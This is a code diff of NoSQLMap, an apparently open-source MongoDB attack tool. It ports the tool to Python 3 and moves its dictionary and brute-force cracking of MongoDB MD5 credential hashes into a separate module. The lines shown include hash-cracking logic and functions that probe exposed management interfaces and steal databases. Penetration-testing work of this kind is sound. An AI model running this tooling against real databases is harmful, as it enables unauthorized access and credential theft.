@@ -1,14 +1,13 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 # NoSQLMap Copyright 2012-2017 NoSQLMap Development team
 # See the file 'doc/COPYING' for copying permission
 
-from exception import NoSQLMapException
+from .exceptions import NoSQLMapException
+from . import brute
 import pymongo
-import six.moves.urllib.request, six.moves.urllib.parse, six.moves.urllib.error
+import urllib.request
 import json
 import gridfs
-import itertools
-import string
 import subprocess
 from hashlib import md5
 import os
@@ -69,7 +68,7 @@ def netAttacks(target, dbPort, myIP, myPort, args=None):
     # Future rev:  Add web management interface parsing
 
     try:
-        mgtRespCode = six.moves.urllib.request.urlopen(mgtUrl).getcode()
+        mgtRespCode = urllib.request.urlopen(mgtUrl).getcode()
         if mgtRespCode == 200:
             print(
                 "MongoDB web management open at "
@@ -80,7 +79,7 @@ def netAttacks(target, dbPort, myIP, myPort, args=None):
 
         if testRest in yes_tag:
             restUrl = mgtUrl + "/listDatabases?text=1"
-            restResp = six.moves.urllib.request.urlopen(restUrl).read()
+            restResp = urllib.request.urlopen(restUrl).read()
             restOn = restResp.find("REST is not enabled.")
 
             if restOn == -1:
@@ -211,107 +210,13 @@ def stealDBs(myDB, victim, mongoConn):
             return
 
 
+def verify_md5(user, candidate, encPass):
+    """Return True if ``candidate`` matches the MongoDB MD5 auth hash."""
+    return md5((user + ":mongo:" + candidate).encode()).hexdigest() == encPass
+
+
 def passCrack(user, encPass):
-    select = True
-    print("Select password cracking method: ")
-    print("1-Dictionary Attack")
-    print("2-Brute Force")
-    print("3-Exit")
-
-    while select:
-        select = input("Selection: ")
-        if select == "1":
-            select = False
-            dict_pass(user, encPass)
-
-        elif select == "2":
-            select = False
-            brute_pass(user, encPass)
-
-        elif select == "3":
-            return
-    return
-
-
-def gen_pass(user, passw, hashVal):
-    if md5(user + ":mongo:" + str(passw)).hexdigest() == hashVal:
-        print("Found - " + user + ":" + passw)
-        return True
-    else:
-        return False
-
-
-def dict_pass(user, key):
-    loadCheck = False
-
-    while loadCheck == False:
-        dictionary = input("Enter path to password dictionary: ")
-        try:
-            with open(dictionary) as f:
-                passList = f.readlines()
-            loadCheck = True
-        except NoSQLMapException:
-            print(" Couldn't load file.")
-
-    print("Running dictionary attack...")
-    for passGuess in passList:
-        temp = passGuess.split("\n")[0]
-        gotIt = gen_pass(user, temp, key)
-
-        if gotIt == True:
-            break
-    return
-
-
-def genBrute(chars, maxLen):
-    return (
-        "".join(candidate)
-        for candidate in itertools.chain.from_iterable(
-            itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)
-        )
-    )
-
-
-def brute_pass(user, key):
-    charSel = True
-    print("\n")
-    maxLen = input("Enter the maximum password length to attempt: ")
-    print("1-Lower case letters")
-    print("2-Upper case letters")
-    print("3-Upper + lower case letters")
-    print("4-Numbers only")
-    print("5-Alphanumeric (upper and lower case)")
-    print("6-Alphanumeric + special characters")
-    charSel = input("\nSelect character set to use:")
-
-    if charSel == "1":
-        chainSet = string.ascii_lowercase
-
-    elif charSel == "2":
-        chainSet = string.ascii_uppercase
-
-    elif charSel == "3":
-        chainSet = string.ascii_letters
-
-    elif charSel == "4":
-        chainSet = string.digits
-
-    elif charSel == "5":
-        chainSet = string.ascii_letters + string.digits
-
-    elif charSel == "6":
-        chainSet = (
-            string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"
-        )
-    count = 0
-    print("\n", end=" ")
-    for attempt in genBrute(chainSet, int(maxLen)):
-        print("\rCombinations tested: " + str(count) + "\r")
-        count += 1
-        if md5(user + ":mongo:" + str(attempt)).hexdigest() == key:
-            print("\nFound - " + user + ":" + attempt)
-            break
-    return
+    brute.crack(lambda c: verify_md5(user, c, encPass), "Found - " + user + ":")
 
 
 def getPlatInfo(mongoConn):
